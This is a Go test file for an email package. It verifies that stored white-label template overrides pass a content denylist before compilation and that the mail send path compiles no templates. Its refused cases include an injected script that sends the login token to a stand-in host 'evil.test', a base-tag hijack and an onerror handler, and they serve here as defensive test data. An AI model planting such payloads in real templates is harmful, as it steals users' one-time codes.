package email

import (
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"
)

// ASVS V1.3.7. The white-label feature lets a super_admin store a template
// body, and the send path turned that stored string into an executable
// html/template on every cache miss. compileOverride only parsed: it never ran
// validateTemplate, which is the denylist ValidateTemplateContent applies at
// admin-write time. So the admin API was the only door with a lock on it, and
// any row that reached email_templates another way — a restored backup, a
// direct write by vault_app, a row written before the validation existed — was
// compiled and executed unchecked while a one-time code was being mailed.
//
// The fix is that the send path compiles nothing: it can only execute a
// *CompiledOverride, and CompileOverride is the sole constructor and validates
// before it parses.

func TestCompileOverrideValidatesBeforeItParses(t *testing.T) {
	refused := []struct {
		name string
		ov   TemplateOverride
	}{
		{"script tag", TemplateOverride{Subject: "Verify", HTMLContent: `<p>hi</p><script>fetch('https://evil.test?t={{.Token}}')</script>`}},
		{"base hijack", TemplateOverride{Subject: "Verify", HTMLContent: `<base href="https://evil.test/"><a href="/reset">reset</a>`}},
		{"event handler", TemplateOverride{Subject: "Verify", HTMLContent: `<img src="x" onerror="alert(1)">`}},
		{"empty subject", TemplateOverride{Subject: "  ", HTMLContent: `<p>hi</p>`}},
		{"unparsable", TemplateOverride{Subject: "Verify", HTMLContent: `<p>{{.Token</p>`}},
	}
	for _, tt := range refused {
		t.Run(tt.name, func(t *testing.T) {
			if _, err := CompileOverride(tt.ov); err == nil {
				t.Fatalf("CompileOverride accepted %q", tt.ov.HTMLContent)
			}
		})
	}

	t.Run("a valid override compiles and renders", func(t *testing.T) {
		c, err := CompileOverride(TemplateOverride{Subject: "Verify {{.AppName}}", HTMLContent: `<p>Hello, code {{.Code}}</p>`})
		if err != nil {
			t.Fatalf("CompileOverride: %v", err)
		}
		subject, html, text, err := c.render(TemplateData{AppName: "Acme", Code: "123456"})
		if err != nil {
			t.Fatalf("render: %v", err)
		}
		if subject != "Verify Acme" {
			t.Errorf("subject = %q, want %q", subject, "Verify Acme")
		}
		if !strings.Contains(html, "123456") {
			t.Errorf("html = %q, want the code interpolated", html)
		}
		if !strings.Contains(text, "123456") {
			t.Errorf("text = %q, want the derived plain text", text)
		}
	})
}

// The send path must hold no template compiler at all. Validation that lives
// one call away from a Parse is validation that a later refactor can route
// around; this makes routing around it a compile-time impossibility in the file
// that renders outgoing mail.
func TestMailerSendPathCompilesNoTemplate(t *testing.T) {
	fset := token.NewFileSet()
	file, err := parser.ParseFile(fset, "mailer.go", nil, 0)
	if err != nil {
		t.Fatalf("parse mailer.go: %v", err)
	}
	ast.Inspect(file, func(n ast.Node) bool {
		sel, ok := n.(*ast.SelectorExpr)
		if !ok {
			return true
		}
		switch sel.Sel.Name {
		case "Parse", "ParseFS", "ParseFiles", "ParseGlob", "Must":
			t.Errorf("mailer.go:%d compiles a template on the send path (%s); "+
				"compilation belongs to CompileOverride, which validates first",
				fset.Position(sel.Pos()).Line, sel.Sel.Name)
		}
		return true
	})
}
